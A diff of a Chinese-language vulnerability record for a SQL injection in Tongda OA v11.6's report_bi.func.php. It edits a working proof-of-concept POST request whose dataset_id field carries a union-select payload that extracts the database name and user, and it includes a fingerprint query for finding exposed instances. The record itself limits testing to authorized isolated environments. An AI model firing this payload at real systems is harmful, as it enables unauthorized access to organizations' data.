@@ -39,7 +39,7 @@ schema_version: "1"
 
 ## 操作风险
 
-请求可能删除/覆盖数据、修改账号或持久改变业务状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+请求可能删除/覆盖数据、修改账号或持久改变业务状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -71,13 +71,14 @@ app="TDXK-通达OA"
 POST /general/bi_design/appcenter/report_bi.func.php HTTP/1.1
 Host: 
 User-Agent: Go-http-client/1.1
+Content-Length: 113
 Content-Type: application/x-www-form-urlencoded
 Accept-Encoding: gzip
 
 _POST[dataset_id]=efgh%27-%40%60%27%60%29union+select+database%28%29%2C2%2Cuser%28%29%23%27&action=get_link_info&
 ```
 
-> 请求长度说明：原资料 Content-Length 为 113；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 113；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 ![image-20220520154246274](./.resource/通达OA-v11.6-report_bi.func.php-SQL注入漏洞/media/202205201542313.png)
 
